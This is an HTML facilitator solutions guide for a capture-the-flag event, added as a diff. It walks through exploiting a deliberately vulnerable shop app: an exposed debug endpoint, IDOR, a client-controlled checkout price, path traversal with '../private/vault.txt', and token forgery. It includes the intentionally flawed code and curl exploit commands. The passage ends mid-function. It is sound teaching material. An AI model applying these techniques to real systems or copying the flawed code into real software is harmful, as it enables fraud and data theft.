@@ -1,0 +1,923 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>NeonCart Bug Hunt — Solutions Guide</title>
+<style>
+  :root {
+    color-scheme: dark;
+    --bg: #0b0e14;
+    --panel: #12161f;
+    --panel2: #171c27;
+    --border: #232a38;
+    --ink: #d7dce6;
+    --ink-soft: #8b94a8;
+    --paper: #0b0e14;
+    --shade: #171c27;
+    --accent: #5eead4;
+    --accent-soft: rgba(94, 234, 212, 0.08);
+    --warm: #fbbf24;
+    --warm-soft: rgba(251, 191, 36, 0.08);
+    --violet: #a78bfa;
+    --code: #0e1219;
+    --code-ink: #d7dce6;
+  }
+  html.light {
+    color-scheme: light;
+    --bg: #ffffff;
+    --panel: #ffffff;
+    --panel2: #f5f7fb;
+    --border: #dfe3ec;
+    --ink: #1a1f2b;
+    --ink-soft: #55607a;
+    --paper: #ffffff;
+    --shade: #f5f7fb;
+    --accent: #0d7a6b;
+    --accent-soft: #e3f4f1;
+    --warm: #b4530a;
+    --warm-soft: #fdf0e3;
+    --code: #161b26;
+    --code-ink: #d7dce6;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font: 16px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  .wrap { max-width: 940px; margin: 0 auto; padding: 0 24px 80px; }
+
+  header.cover {
+    border-bottom: 1px solid var(--border);
+    padding: 48px 0 28px;
+    margin-bottom: 8px;
+    position: relative;
+  }
+  .kicker { letter-spacing: 3px; text-transform: uppercase; font-size: 12px; color: var(--accent); font-weight: 700; }
+  h1 { font-size: 38px; line-height: 1.15; margin: 10px 0 8px; letter-spacing: -0.5px; color: var(--ink); }
+  .lede { color: var(--ink-soft); font-size: 18px; max-width: 62ch; margin: 0 0 20px; }
+  .meta { display: flex; flex-wrap: wrap; gap: 10px; }
+  .pill {
+    border: 1px solid var(--border); border-radius: 999px; padding: 5px 12px;
+    font-size: 13px; color: var(--ink-soft); background: var(--shade);
+  }
+  .pill strong { color: var(--ink); }
+
+  .themebtn {
+    position: absolute; top: 44px; right: 0;
+    background: var(--shade); border: 1px solid var(--border); color: var(--ink-soft);
+    border-radius: 999px; padding: 6px 14px; font: inherit; font-size: 12.5px; cursor: pointer;
+  }
+  .themebtn:hover { color: var(--accent); border-color: var(--accent); }
+
+  h2 { font-size: 26px; margin: 52px 0 6px; letter-spacing: -0.3px; color: var(--ink); }
+  h2 .num { color: var(--accent); }
+  h3 { font-size: 18px; margin: 30px 0 8px; color: var(--ink); }
+  h4 { font-size: 12px; text-transform: uppercase; letter-spacing: 1.4px; color: var(--ink-soft); margin: 26px 0 8px; }
+  p { max-width: 74ch; }
+  a { color: var(--accent); }
+
+  nav.toc {
+    background: var(--panel); border: 1px solid var(--border); border-radius: 12px;
+    padding: 18px 22px; margin: 28px 0 8px;
+  }
+  nav.toc h4 { margin: 0 0 10px; }
+  nav.toc ol { margin: 0; padding-left: 20px; columns: 2; column-gap: 30px; }
+  nav.toc li { margin: 4px 0; }
+  nav.toc a { text-decoration: none; color: var(--ink); }
+  nav.toc a:hover { color: var(--accent); }
+
+  figure { margin: 22px 0 8px; }
+  figure img {
+    width: 100%; border: 1px solid var(--border); border-radius: 10px; display: block;
+    box-shadow: 0 4px 22px rgba(0, 0, 0, 0.45);
+  }
+  figcaption { font-size: 13.5px; color: var(--ink-soft); margin-top: 8px; }
+  figcaption .file { color: var(--accent); font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12.5px; }
+
+  pre {
+    background: var(--code); color: var(--code-ink); border: 1px solid var(--border); border-radius: 10px;
+    padding: 16px 18px; overflow-x: auto; font-size: 13px; line-height: 1.55;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  pre code { font-family: inherit; }
+  .cmt { color: #7b87a1; }
+  .str { color: #9ae6b4; }
+  .kw  { color: #7cc4ff; }
+  .bad { color: #ff9a8b; }
+  .good { color: #9ae6b4; }
+
+  .card {
+    border: 1px solid var(--border); border-radius: 12px; padding: 18px 22px;
+    margin: 18px 0; background: var(--panel);
+  }
+  .card.tip { border-left: 4px solid var(--accent); background: var(--accent-soft); }
+  .card.warn { border-left: 4px solid var(--warm); background: var(--warm-soft); }
+  .card h4 { margin-top: 0; }
+  .card p:last-child { margin-bottom: 0; }
+
+  table { border-collapse: collapse; width: 100%; margin: 18px 0; font-size: 14.5px; }
+  th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  th { background: var(--shade); font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--ink-soft); }
+  tr:last-child td { border-bottom: none; }
+  td code, p code, li code { background: var(--shade); border: 1px solid var(--border); border-radius: 5px; padding: 1px 5px; font-size: 13.5px; color: var(--accent); }
+  /* code blocks inside list items must not inherit the inline chip style */
+  pre code, p pre code, li pre code {
+    background: transparent; border: 0; padding: 0; border-radius: 0;
+    color: inherit; font-size: inherit; line-height: inherit;
+  }
+
+  ol.steps { counter-reset: step; list-style: none; padding: 0; margin: 16px 0; }
+  ol.steps > li { counter-increment: step; position: relative; padding: 0 0 14px 44px; margin: 0; }
+  ol.steps > li::before {
+    content: counter(step); position: absolute; left: 0; top: 1px;
+    width: 28px; height: 28px; border-radius: 50%; background: var(--accent); color: #06251f;
+    display: grid; place-items: center; font-size: 13px; font-weight: 700;
+  }
+  ol.steps > li > strong { display: block; margin-bottom: 2px; color: var(--ink); }
+  ol.steps ul { margin: 6px 0 0; padding-left: 20px; }
+  ol.steps li li { margin: 4px 0; }
+
+  .flag {
+    display: inline-block; font-family: ui-monospace, Menlo, Consolas, monospace;
+    background: var(--panel2); color: var(--accent); border: 1px solid var(--border); border-radius: 6px;
+    padding: 2px 8px; font-size: 14px;
+  }
+  .tag {
+    display: inline-block; font-size: 11.5px; text-transform: uppercase; letter-spacing: 1px;
+    padding: 3px 9px; border-radius:  999px; font-weight: 700; vertical-align: middle;
+  }
+  .tag.easy { background: rgba(94, 234, 212, 0.12); color: var(--accent); }
+  .tag.medium { background: rgba(251, 191, 36, 0.12); color: var(--warm); }
+  .tag.finale { background: rgba(167, 139, 250, 0.12); color: var(--violet); }
+  .tag.support { background: var(--shade); color: var(--ink-soft); }
+
+  .hintlvl { border-left: 3px solid var(--border); padding: 8px 0 8px 16px; margin: 10px 0; color: var(--ink-soft); }
+  .hintlvl b { color: var(--accent); }
+
+  footer { border-top: 1px solid var(--border); margin-top: 60px; padding-top: 20px; color: var(--ink-soft); font-size: 14px; }
+
+  @media print {
+    html, html.light { color-scheme: light; }
+    body { font-size: 11pt; background: #fff; color: #1a1f2b; }
+    .wrap { max-width: none; padding: 0; }
+    h1, h2, h3, h4 { color: #1a1f2b; }
+    p, li, td { color: #1a1f2b; }
+    .lede, figcaption, .hintlvl, footer, .pill { color: #55607a; }
+    .themebtn { display: none; }
+    nav.toc { background: #f5f7fb; break-after: page; }
+    h2 { break-before: page; }
+    figure, .card, pre { break-inside: avoid; }
+    pre { background: #f2f4f8 !important; color: #1a1f2b !important; border: 1px solid #dfe3ec; }
+    pre .cmt { color: #667089; }
+    pre .kw  { color: #1d4ed8; }
+    pre .str { color: #047857; }
+    pre .bad { color: #b91c1c; }
+    .card { background: #fff; }
+    .card.tip { background: #f0fbf8; }
+    .card.warn { background: #fdf6ee; }
+    .pill { background: #f5f7fb; }
+    td code, p code, li code { background: #f5f7fb; border-color: #dfe3ec; color: #0d7a6b; }
+    .flag { background: #f0f0f0; color: #0d7a6b; border-color: #dfe3ec; }
+    .tag.easy { background: #e3f4f1; color: #0d7a6b; }
+    .tag.medium { background: #fdf0e3; color: #b4530a; }
+    .tag.finale { background: #f2e9ff; color: #6b3fd4; }
+    .tag.support { background: #eef0f5; color: #55607a; }
+    figure img { box-shadow: none; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="cover">
+  <div class="kicker">Facilitator document · do not share with players</div>
+  <h1>NeonCart Bug Hunt<br />Solutions Guide</h1>
+  <p class="lede">
+    A step-by-step walkthrough of all six stages, with the exact code the
+    players are looking at, the click path for every exploit, the API equivalent,
+    and the hints to hand out when the room goes quiet.
+  </p>
+  <button class="themebtn" id="themebtn" type="button">☾ Dark</button>
+  <div class="meta">
+    <span class="pill"><strong>6</strong> stages</span>
+    <span class="pill"><strong>6</strong> flags</span>
+    <span class="pill"><strong>50–700</strong> pts per flag</span>
+    <span class="pill"><strong>1,900</strong> total points</span>
+    <span class="pill">Difficulty: <strong>very easy → medium</strong></span>
+  </div>
+</header>
+
+<nav class="toc">
+  <h4>Contents</h4>
+  <ol>
+    <li><a href="#how">How to run the session</a></li>
+    <li><a href="#mechanics">Mechanics players will meet</a></li>
+    <li><a href="#m00">00 · Project Scaffold — the first flag</a></li>
+    <li><a href="#m01">01 · Diagnostics — exposed debug route</a></li>
+    <li><a href="#m02">02 · Support Tickets — IDOR</a></li>
+    <li><a href="#m03">03 · Billing & Checkout — client price</a></li>
+    <li><a href="#m04">04 · Profile & File Uploads — path traversal</a></li>
+    <li><a href="#m05">05 · Sessions & Tokens — token forgery</a></li>
+    <li><a href="#timeline">Suggested run of show</a></li>
+    <li><a href="#trouble">Troubleshooting</a></li>
+    <li><a href="#glossary">Glossary for players</a></li>
+  </ol>
+</nav>
+
+<!-- ============================ HOW ============================ -->
+<h2 id="how"><span class="num">01.</span> How to run the session</h2>
+
+<p>
+  The premise: a startup called NeonCart shipped an e-commerce platform that
+  was written entirely by AI agents — fast, confident and barely reviewed. The
+  code is released to the room one stage at a time. Players read it, run it,
+  break it and capture the flag the app produces. Some flags are reached through
+  bugs in the code.
+</p>
+
+<h3>Before the doors open</h3>
+<ol class="steps">
+  <li>
+    <strong>Provision Appwrite</strong>
+    <pre><code>cd appwrite
+npm install
+cp env.sample .env          # add your Appwrite API key
+npm run setup
+npm run deploy
+npm run check</code></pre>
+  </li>
+  <li>
+    <strong>Start the local admin panel</strong>
+    <pre><code>cd admin
+npm install
+cp env.sample .env          # add the same Appwrite API key
+npm run dev</code></pre>
+  </li>
+  <li>
+    <strong>Start the portal</strong>
+    <pre><code>cd portal
+npm install
+npm run dev</code></pre>
+  </li>
+</ol>
+
+<div class="card tip">
+  <h4>Tell the room this, in one sentence</h4>
+  <p>
+    "Sign into the portal with the account we gave you. When a module opens,
+    download its zip, run the complete app with the seed shown in the portal,
+    investigate it, and submit your flag there. The six modules are worth
+    50, 100, 200, 350, 500, and 700 points."
+  </p>
+</div>
+
+<!-- ============================ MECHANICS ============================ -->
+<h2 id="mechanics"><span class="num">02.</span> Mechanics players will meet</h2>
+
+<figure>
+  <img src="photos/portal-modules.png" alt="The portal module list" />
+  <figcaption>
+    <span class="file">photos/portal-modules.png</span> — an earlier portal view. The current
+    portal lists modules 00–05; released modules can be downloaded, and each card has
+    its own flag submission box.
+  </figcaption>
+</figure>
+
+<table>
+  <thead>
+    <tr><th>What the player sees</th><th>What it means</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Locked</td>
+      <td>The facilitator has not released this module yet.</td>
+    </tr>
+    <tr>
+      <td><span class="tag easy">flag · 50–700 pts</span></td>
+      <td>Each module has one flag. Point values are 50, 100, 200, 350, 500, and 700 for modules 00–05.</td>
+    </tr>
+    <tr>
+      <td>Badge: <b>LOCKED</b></td>
+      <td>Not released yet. Wait for the admin.</td>
+    </tr>
+    <tr>
+      <td>Badge: <b>OPEN</b></td>
+      <td>The facilitator released it. Its stage zip is downloadable by every player.</td>
+    </tr>
+    <tr>
+      <td>Badge: <b>UNLOCKED</b> + <b>Submit</b></td>
+      <td>You have the code. Find the bug, capture the flag, submit it.</td>
+    </tr>
+    <tr>
+      <td>Button: <b>Refresh status</b></td>
+      <td>Check whether the facilitator has released this module since the portal was opened.</td>
+    </tr>
+    <tr>
+      <td><b>SOLVED</b></td>
+      <td>Flag accepted and the module's listed points are added to your score. There are no speed or early-unlock bonuses.</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="card warn">
+  <h4>Flags are unique per player</h4>
+  <p>
+    Stage zips are shared. Your seed is shown in your signed-in portal account;
+    pass it to the app with <code>PLAYER_SEED</code> or put it in
+    <code>config/player-license.json</code>. Flags are derived from that seed, so
+    different players receive different flags.
+  </p>
+</div>
+
+<!-- ============================ MODULE 00 ============================ -->
+<h2 id="m00"><span class="num">03.</span> Module 00 — Project Scaffold <span class="tag easy">the opener</span></h2>
+
+<p>
+  <strong>Teaches:</strong> the loop the whole session is built on — download the
+  snapshot, run it, read the flag the app prints, submit it in the portal. There
+  is no technique here and there does not need to be one. The deployment stamped
+  a build key into the storefront, and the storefront is the first thing a
+  player sees.
+</p>
+
+<figure>
+  <img src="photos/app-storefront.png" alt="The storefront printing the build key" />
+  <figcaption>
+    <span class="file">photos/app-storefront.png</span> — the home page ends with a
+    <b>Build information</b> panel, and the build key in it is
+    <span class="flag">FLAG{…}</span>. Every player gets their own.
+  </figcaption>
+</figure>
+
+<h4>The code the player is reading</h4>
+<pre><code><span class="cmt">// src/routes/00-storefront.js</span>
+<span class="kw">function</span> buildKey() {
+  <span class="kw">if</span> (!SALT) <span class="kw">return</span> <span class="kw">null</span>
+  <span class="kw">try</span> {
+    <span class="kw">return</span> deriveFlag(readLicense().seed, SALT)   <span class="cmt">// ← the seed is yours alone</span>
+  } <span class="kw">catch</span> {
+    <span class="cmt">// seed comes from the portal or config/player-license.json</span>
+    <span class="kw">return</span> <span class="kw">null</span>
+  }
+}</code></pre>
+
+<h4>Solution — in the browser</h4>
+<ol class="steps">
+  <li><strong>Run the app</strong> — <code>node server.js</code>, then open <code>http://localhost:3307</code>. You land on the NeonCart storefront: three products, shipping badges, the usual noise.</li>
+  <li><strong>Scroll to the bottom</strong> — the last panel is <b>Build information</b>: a build number and a <b>Build key</b>.</li>
+  <li><strong>Read the build key</strong> — it is <span class="flag">FLAG{…}</span>, in the same green as every flag in this session.</li>
+  <li><strong>Submit it</strong> in the portal's module 00 box → 50 points.</li>
+</ol>
+
+<h4>Solution — with curl</h4>
+<pre><code>curl -s http://localhost:3307/ | grep -o 'FLAG{[0-9a-f]*}'
+<span class="cmt"># FLAG{489fe6a210}</span></code></pre>
+
+<div class="card tip">
+  <h4>What the log shows</h4>
+  <p>Nothing special — this module has no exploit, only a page. Say that out loud: the app is not where the flag <em>lives</em>, the response is.</p>
+</div>
+
+<div class="card">
+  <h4>Where players get stuck</h4>
+  <ul>
+    <li>They look for a challenge and find nothing to break. Reassure them: module 00 is a guided warm-up, and the flag is <em>printed</em> — their first win is learning where a flag comes from.</li>
+    <li>They try to grep the source for <code>FLAG{</code> and find nothing. That is the point of the whole platform: no flag text ever exists in the code, only in a response.</li>
+    <li>They have not supplied their seed. Use the <code>PLAYER_SEED</code> command shown in the portal, or paste their seed into <code>config/player-license.json</code>.</li>
+  </ul>
+  <h4>Hints, in order</h4>
+  <div class="hintlvl"><b>1.</b> Run the app and open the home page. Read the page top to bottom.</div>
+  <div class="hintlvl"><b>2.</b> The deployment prints a build key on the storefront. Where would a build stamp live?</div>
+  <div class="hintlvl"><b>3.</b> Scroll to the bottom of <code>http://localhost:3307</code> — the <b>Build information</b> panel.</div>
+</div>
+
+<!-- ============================ MODULE 02 ============================ -->
+<h2 id="m01"><span class="num">04.</span> Module 01 — Diagnostics <span class="tag easy">very easy</span></h2>
+
+<p>
+  <strong>Teaches:</strong> an endpoint that should not be public. No technique
+  needed — just look at what the app exposes. This is the opener: it proves to the
+  room that the exploit is a real, findable thing and not a trick.
+</p>
+
+<figure>
+  <img src="photos/app-diagnostics.png" alt="The diagnostics page printing the internal build key" />
+  <figcaption>
+    <span class="file">photos/app-diagnostics.png</span> — the System status page prints the raw
+    service report, and the report contains <code>internal_build_key</code>: the flag.
+  </figcaption>
+</figure>
+
+<h4>The code the player is reading</h4>
+<pre><code><span class="cmt">// src/routes/01-diagnostics.js</span>
+<span class="kw">function</span> diagnostics(req, res) {
+  log.info(<span class="str">'diagnostics'</span>, <span class="str">'diagnostics report requested'</span>)
+  json(res, 200, {
+    service: <span class="str">'neoncart'</span>,
+    build: <span class="str">'0.4.2-ai-preview'</span>,
+    node: process.version,
+    features: [<span class="str">'catalog'</span>, <span class="str">'checkout'</span>, <span class="str">'uploads'</span>, <span class="str">'tickets'</span>, <span class="str">'sessions'</span>],
+    internal_build_key: <span class="bad">deriveFlag(readLicense().seed, SALT)</span>,   <span class="cmt">// ← no auth check anywhere</span>
+  })
+}</code></pre>
+
+<h4>Solution — in the browser</h4>
+<ol class="steps">
+  <li><strong>Open the app</strong> — <code>http://localhost:3307</code>. You land on the storefront. The nav bar is the shop's own menu: Storefront, System status, Support, Checkout, Profile, Account.</li>
+  <li><strong>Click “System status”</strong> in the nav bar. Every service shows as operational — and there is a “Full report” section with a <b>Refresh report</b> button.</li>
+  <li><strong>Click “Refresh report”</strong>. The raw service report is printed in the box.</li>
+  <li><strong>Read <code>internal_build_key</code></strong> in the report — that value is <span class="flag">FLAG{…}</span>.</li>
+  <li><strong>Submit it</strong> in the portal's module 01 box → 100 points.</li>
+</ol>
+
+<h4>Solution — with curl</h4>
+<pre><code>curl -s http://localhost:3307/api/debug/diagnostics
+<span class="cmt"># {"service":"neoncart",…,"internal_build_key":"FLAG{eda4a95875}"}</span></code></pre>
+
+<div class="card tip">
+  <h4>What the log shows</h4>
+  <p><code>info [diagnostics] diagnostics report requested</code> — the app tells you it served the report. Nothing else is needed.</p>
+</div>
+
+<div class="card">
+  <h4>Where players get stuck</h4>
+  <ul>
+    <li>They scroll past the nav bar and try to read every file. Point them at the nav: the pages are the app's own menu.</li>
+    <li>They look for the flag in the source code. Explain that flags are never in the code — only the <em>response</em> carries one.</li>
+    <li>They never press “Refresh report” because the status page already says everything is fine. The interesting part is the report, not the badges.</li>
+  </ul>
+  <h4>Hints, in order</h4>
+  <div class="hintlvl"><b>1.</b> The app lists everything it can do. Start from the nav bar.</div>
+  <div class="hintlvl"><b>2.</b> The status page offers a “full report”. What would a report that nobody reads carefully contain?</div>
+  <div class="hintlvl"><b>3.</b> Try <code>GET /api/debug/diagnostics</code> and read the whole response.</div>
+</div>
+
+<!-- ============================ MODULE 03 ============================ -->
+<h2 id="m02"><span class="num">05.</span> Module 02 — Support Tickets <span class="tag easy">easy</span></h2>
+
+<p>
+  <strong>Teaches:</strong> an object that belongs to somebody else. The list
+  endpoint filters by owner; the detail endpoint was written earlier and never
+  got the same treatment. The flag is inside a staff-only ticket.
+</p>
+
+<figure>
+  <img src="photos/app-tickets.png" alt="Opening ticket 1 in the tickets page" />
+  <figcaption>
+    <span class="file">photos/app-tickets.png</span> — the Support page with <code>?id=1</code> in the
+    URL: a staff incident report that the customer was never meant to see, and the flag is in it.
+  </figcaption>
+</figure>
+
+<h4>The code the player is reading</h4>
+<pre><code><span class="cmt">// src/routes/02-tickets.js</span>
+<span class="kw">function</span> listTickets(req, res) {
+  <span class="kw">const</span> mine = TICKETS.filter((t) =&gt; t.owner === DEMO_USER)   <span class="cmt">// ← list DOES check the owner</span>
+  json(res, 200, { tickets: mine })
+}
+
+<span class="kw">function</span> getTicket(req, res, body, url) {
+  <span class="kw">const</span> id = Number(url.searchParams.get(<span class="str">'id'</span>))
+  <span class="kw">const</span> ticket = TICKETS.find((t) =&gt; t.id === id)             <span class="cmt">// ← detail does NOT check the owner</span>
+  <span class="kw">if</span> (!ticket) <span class="kw">return</span> json(res, 404, { error: <span class="str">'ticket not found'</span> })
+  json(res, 200, { ticket })
+}</code></pre>
+
+<h4>Solution — in the browser</h4>
+<ol class="steps">
+  <li><strong>Click “Support”</strong> in the nav bar. Under “Your requests” you see two rows — <code>#2</code> and <code>#3</code>.</li>
+  <li><strong>Click one of them.</strong> The URL becomes <code>/ui/tickets?id=2</code>. That is how the app addresses a ticket.</li>
+  <li><strong>Change the id in the URL to <code>1</code></strong> and press enter.</li>
+  <li><strong>Read the ticket</strong> — “Incident report 4711”, owner <em>staff</em>, ending with the handover code, which is <span class="flag">FLAG{…}</span>.</li>
+  <li><strong>Submit it</strong> in the portal.</li>
+</ol>
+
+<h4>Solution — with curl</h4>
+<pre><code>curl -s <span class="str">"http://localhost:3307/api/tickets/detail?id=1"</span>
+<span class="cmt"># {"ticket":{"id":1,"owner":"staff","subject":"Incident report 4711",…}}</span></code></pre>
+
+<div class="card tip">
+  <h4>What the log shows</h4>
+  <p><code>info [tickets] opened ticket 1 (owner: staff)</code> — the server prints the owner it served. That line is the hint that the check is missing.</p>
+</div>
+
+<div class="card">
+  <h4>Where players get stuck</h4>
+  <ul>
+    <li>They only try ids 2 and 3 because those are the ones listed. The whole point is that the list does not show everything.</li>
+    <li>They try <code>/api/tickets/1</code> (path style) instead of <code>/api/tickets/detail?id=1</code> — the app uses a query parameter. The route list at <code>GET /</code> shows the exact shape.</li>
+    <li>They never notice that the URL carries the ticket id. Click a ticket and look at the address bar — that is the whole trick.</li>
+  </ul>
+  <h4>Hints, in order</h4>
+  <div class="hintlvl"><b>1.</b> You can only see your own tickets. But the server can serve any ticket by id.</div>
+  <div class="hintlvl"><b>2.</b> What id is missing from your list?</div>
+  <div class="hintlvl"><b>3.</b> Open a ticket and look at the URL, then change the number in it.</div>
+</div>
+
+<!-- ============================ MODULE 04 ============================ -->
+<h2 id="m03"><span class="num">06.</span> Module 03 — Billing & Checkout <span class="tag medium">easy–medium</span></h2>
+
+<p>
+  <strong>Teaches:</strong> never trust a price that came from the client. The
+  checkout takes the amount to charge straight from the request, and orders below
+  list price go through an internal re-pricing path that prints the internal
+  coupon code.
+</p>
+
+<figure>
+  <img src="photos/app-checkout.png" alt="Paying 1 instead of 199" />
+  <figcaption>
+    <span class="file">photos/app-checkout.png</span> — the cart is a real cart, and the request the
+    browser sends carries the total. Paying 1 instead of 199 returns the internal coupon code.
+  </figcaption>
+</figure>
+
+<h4>The code the player is reading</h4>
+<pre><code><span class="cmt">// src/routes/03-billing.js</span>
+<span class="kw">const</span> expected = item.price * qty
+
+<span class="cmt">// The agents let the client send the amount it wants to pay, because the</span>
+<span class="cmt">// mobile app "already calculated it".</span>
+<span class="kw">const</span> total = amount === undefined ? expected : <span class="bad">Number(amount)</span>
+
+<span class="kw">if</span> (total &lt; expected) {
+  <span class="cmt">// Support fix path: orders below list price are re-priced by the internal</span>
+  <span class="cmt">// coupon engine and logged with the internal promo code.</span>
+  <span class="kw">return</span> json(res, 200, {
+    order_id: order.id,
+    charged: total,
+    discount_applied: <span class="kw">true</span>,
+    <span class="bad">internal_coupon: deriveFlag(readLicense().seed, SALT)</span>,
+  })
+}</code></pre>
+
+<h4>Solution — in the browser</h4>
+<ol class="steps">
+  <li><strong>Click “Checkout”</strong> in the nav bar. Add the drone to the cart — the total shows $199.00, exactly like a real shop.</li>
+  <li><strong>Open the browser's devtools → Network → Fetch/XHR</strong> and press <b>Place order</b>. The request body shows what the browser sent: <code>item_id</code>, <code>quantity</code> and <code>amount</code>.</li>
+  <li><strong>Edit the request</strong> so <code>amount</code> is <code>1</code> (Chrome: right-click the request → Edit and Resend), or call the endpoint yourself with that body.</li>
+  <li><strong>Read <code>internal_coupon</code></strong> from the response — that is <span class="flag">FLAG{…}</span>.</li>
+  <li><strong>Submit it</strong> in the portal.</li>
+</ol>
+<p>
+  The same fact is visible without devtools: the page's own script is part of the module
+  source you downloaded — <code>src/routes/03-billing.js</code> contains the
+  <code>pay()</code> function, and it sends <code>amount: cartTotal()</code>. The
+  server never recomputes the price.
+</p>
+
+<h4>Solution — with curl</h4>
+<pre><code>curl -s -X POST http://localhost:3307/api/checkout \
+  -H <span class="str">'content-type: application/json'</span> \
+  -d <span class="str">'{"item_id":"neon-drone","quantity":1,"amount":1}'</span>
+<span class="cmt"># {"order_id":1,"charged":1,"discount_applied":true,"internal_coupon":"FLAG{…}"}</span></code></pre>
+
+<div class="card tip">
+  <h4>What the log shows</h4>
+  <p><code>warn [billing] order 1 paid 1 instead of 199 - re-priced by the internal coupon engine</code></p>
+</div>
+
+<div class="card">
+  <h4>Where players get stuck</h4>
+  <ul>
+    <li>They assume the form is authoritative and pay the list price. The point is that the <em>client</em> decides the amount.</li>
+    <li>They look for a discount <em>code</em> to enter. There is none: you change the amount in the request.</li>
+    <li>They never open devtools. Tell them where the number comes from: the page's own JavaScript, which is in the file they downloaded.</li>
+  </ul>
+  <h4>Hints, in order</h4>
+  <div class="hintlvl"><b>1.</b> Who decides how much you pay — the server, or the browser?</div>
+  <div class="hintlvl"><b>2.</b> Open devtools → Network, place an order, and look at what was sent.</div>
+  <div class="hintlvl"><b>3.</b> <code>{"item_id":"neon-drone","quantity":1,"amount":1}</code></div>
+</div>
+
+<!-- ============================ MODULE 05 ============================ -->
+<h2 id="m04"><span class="num">07.</span> Module 04 — Profile & File Uploads <span class="tag medium">medium</span></h2>
+
+<p>
+  <strong>Teaches:</strong> where the server joins your input. The file name is
+  "sanitised" by stripping leading slashes only, then joined onto the upload
+  directory — so <code>../</code> still walks out of it, into the private vault
+  that holds the storage key.
+</p>
+
+<figure>
+  <img src="photos/app-files.png" alt="Downloading ../private/vault.txt" />
+  <figcaption>
+    <span class="file">photos/app-files.png</span> — the Profile page. The gallery's download link
+    carries the file name; change it and the app serves a file from outside the upload folder.
+  </figcaption>
+</figure>
+
+<h4>The code the player is reading</h4>
+<pre><code><span class="cmt">// src/routes/04-uploads.js</span>
+<span class="cmt">// The agents sanitised the file name by stripping leading slashes and calling</span>
+<span class="cmt">// it a day. The name is still joined onto the upload directory as-is.</span>
+<span class="kw">function</span> safeName(name) {
+  <span class="kw">return</span> String(name || <span class="str">''</span>).replace(<span class="bad">/^\/+/</span>, <span class="str">''</span>)
+}
+
+<span class="kw">function</span> download(req, res, body, url) {
+  <span class="kw">const</span> name = url.searchParams.get(<span class="str">'name'</span>) || <span class="str">'avatar.png'</span>
+  <span class="kw">const</span> target = <span class="bad">path.join(UPLOAD_DIR, safeName(name))</span>   <span class="cmt">// ← no "is it still inside?" check</span>
+  <span class="kw">if</span> (!fs.existsSync(target)) <span class="kw">return</span> json(res, 404, { error: <span class="str">'file not found'</span> })
+  res.writeHead(200, { <span class="str">'content-type'</span>: <span class="str">'text/plain'</span> })
+  res.end(fs.readFileSync(target, <span class="str">'utf8'</span>))
+}</code></pre>
+
+<p>
+  The flag is not a file in the source tree — the app writes it at startup into
+  <code>storage/private/vault.txt</code>, outside the upload directory:
+</p>
+<pre><code><span class="kw">function</span> init() {
+  fs.mkdirSync(UPLOAD_DIR, { recursive: true })
+  fs.mkdirSync(PRIVATE_DIR, { recursive: true })
+  <span class="cmt">// The deployment writes the signed storage key here …</span>
+  <span class="kw">const</span> vault = path.join(PRIVATE_DIR, <span class="str">'vault.txt'</span>)
+  fs.writeFileSync(vault, <span class="bad">deriveFlag(readLicense().seed, SALT)</span>)
+}</code></pre>
+
+<h4>Solution — in the browser</h4>
+<ol class="steps">
+  <li><strong>Click “Profile”</strong> in the nav bar. Under “Your files” is a gallery of the files you uploaded.</li>
+  <li><strong>Look at a download link</strong> — it points at <code>/api/files/download?name=avatar.png</code>. The name is a parameter.</li>
+  <li><strong>Change the name in the link</strong> to <code>../private/vault.txt</code> and open it.</li>
+  <li><strong>Read the response</strong> — the vault contents, which is <span class="flag">FLAG{…}</span>.</li>
+  <li><strong>Submit it</strong> in the portal.</li>
+</ol>
+
+<h4>Solution — with curl</h4>
+<pre><code>curl -s <span class="str">"http://localhost:3307/api/files/download?name=../private/vault.txt"</span>
+<span class="cmt"># FLAG{eda4a95875}</span></code></pre>
+
+<div class="card tip">
+  <h4>What the log shows</h4>
+  <p><code>debug [storage] serving file "../private/vault.txt" from private/vault.txt</code> — the server prints the path it resolved. That single line gives the whole exploit away.</p>
+</div>
+
+<div class="card">
+  <h4>Where players get stuck</h4>
+  <ul>
+    <li>They try <code>/etc/passwd</code> — outside the app folder, so it does not exist in the snapshot. The target is <em>inside</em> the app, one directory up.</li>
+    <li>They need to find the private folder. <code>ls storage/private</code> in the app folder, or the log line after the first attempt, shows the name.</li>
+    <li>They forget that the name is a query parameter: <code>?name=…</code>, and the dots must survive URL encoding.</li>
+    <li>They never look at the gallery links. The link already contains the parameter they need to change.</li>
+  </ul>
+  <h4>Hints, in order</h4>
+  <div class="hintlvl"><b>1.</b> The sanitiser only strips leading slashes. What does it not strip?</div>
+  <div class="hintlvl"><b>2.</b> The flag is in a file, one directory above the upload folder. What is that folder called?</div>
+  <div class="hintlvl"><b>3.</b> Right-click a file in “Your files”, copy the link, and edit the name in it.</div>
+</div>
+
+<!-- ============================ MODULE 05 ============================ -->
+<h2 id="m05"><span class="num">08.</span> Module 05 — Sessions & Tokens <span class="tag finale">medium · finale</span></h2>
+
+<p>
+  <strong>Teaches:</strong> what the server trusted without checking. A session
+  token looks like <code>base64url(payload).signature</code>. The payload is
+  readable, and the verification helper only checks the <em>shape</em> of the
+  token — the signature is never compared with the value the server computes.
+</p>
+
+<figure>
+  <img src="photos/app-session.png" alt="A forged token opening the staff panel" />
+  <figcaption>
+    <span class="file">photos/app-session.png</span> — the Account page shows the session token this
+    browser is signed in with. Edit the payload to <code>role:"admin"</code> and the staff panel answers.
+  </figcaption>
+</figure>
+
+<h4>The code the player is reading</h4>
+<pre><code><span class="cmt">// src/routes/05-sessions.js</span>
+<span class="cmt">// The agents wrote a "verify" helper that only looked at the shape of the</span>
+<span class="cmt">// token. The signature was never compared with anything.</span>
+<span class="kw">function</span> verify(token) {
+  <span class="kw">if</span> (!token || <span class="kw">typeof</span> token !== <span class="str">'string'</span>) <span class="kw">return</span> <span class="kw">null</span>
